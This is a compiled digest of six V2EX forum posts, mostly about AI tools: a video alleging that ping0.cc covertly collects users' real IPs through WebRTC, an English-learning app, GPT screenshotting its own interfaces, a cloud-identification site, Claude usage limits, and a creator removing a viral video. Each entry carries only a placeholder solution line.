#### 361. [V2EX] 用 Claude 做了视频“关于 ping0.cc 静默上传用户真实 IP”

**问题描述 / Problem Description**:
基于隔壁大佬原帖： https://www.nodeseek.com/post-674661-1
大佬实力真的很强啊，原帖挺热闹的，但还是看到很多人用 ping0.cc 来看所谓的是否是家宽。
结论就是：ping0.cc 会偷偷使用混淆加密的代码通过 webrtc 来获得你的国内真实 IP ，同时收集你的浏览器指纹数据。
油管视频链接： https://youtu.be/y6f5iwD4vPs?si=PXb3yoDnmdAPeXgX
ps：claude 做视频真的很屌啊！就是费 token ！

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208381#reply2

---

#### 362. [V2EX] AI 辅助英语学习，无推广，讨论一下

**问题描述 / Problem Description**:
Vibe Coding 了一个 App ，主要功能是，搜索数据库中的字幕，返回字幕结果，点击结果可以从字幕所在的地方开始播放视频。
我的学习流程是：下载影视资源 → 下载字幕 → 找 Gemini 翻译成双语字幕（机翻偏向直译容易理解） → 找 Gemini 分析并找出短语搭配和中文翻译然后导出到 Excel （已经有翻译的情况下，这一步不会脱离语境翻译污染数据） → 扫一下哪些不会或不熟悉的短语，并在这个 App 中搜索观看（常见搭配还会有很多其它视频的结果） → 逐个观看，加深记忆。
这些影视作品之前最好看过，这样可以快速进入语境，增强代入感。
使用了一个多星期，直观感觉是听力水平大幅度提

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208378#reply8

---

#### 363. [V2EX] gpt5.5 写完界面，还会进行截图查看效果

**问题描述 / Problem Description**:
它自己内置的浏览器窗体太小，还会调用 chrome 无头模式宽屏截图

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208353#reply5

---

#### 364. [V2EX] 做了一个自动识别云朵的网站

**问题描述 / Problem Description**:
上传云朵即可得到云朵的识别结果，这个是什么云，以及云的科普和是否会下雨相关的介绍
https://whatisthiscloud.org/
识别结果

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208313#reply1

---

#### 365. [V2EX] claude 太抠门了

**问题描述 / Problem Description**:
现在的 usage 重置时间不是向前取整到整点了，而是精确到本时间窗口的第一条消息的分钟。这意味着如果不卡着上一个窗口结束的时间去使用，就可能用不到每月 4 个周限、每周 9 个 5 小时限制了

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208274#reply1

---

#### 366. [V2EX] 继上次讨论自媒体问题后，我决定下架流量最大的视频

**问题描述 / Problem Description**:
这是原视频，因为基本没有效的声音信息，就转 gif 了

（标题：能不能保持安全距离，害人害己啊）
就这一个 7s 的视频，不提供其他任何信息的情况下，各位可以猜一下播放量
一些数据截图


这个视频给我的频道带来了太多噪声，偏离频道初衷，虽然流量大，但是还是先下架降温了
就像 GPT 说的
最后一句话

流量不是资产，匹配的流量才是。

你现在这波，更像是：
👉 “把一群不对的人请进了家里，还很吵”

你不需要对他们负责。

这个视频后续我甚至做了一个新的视频来解释前因后果，但是基本无济于事，就像看不懂中文一样

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.v2ex.com/t/1208270#reply6

---
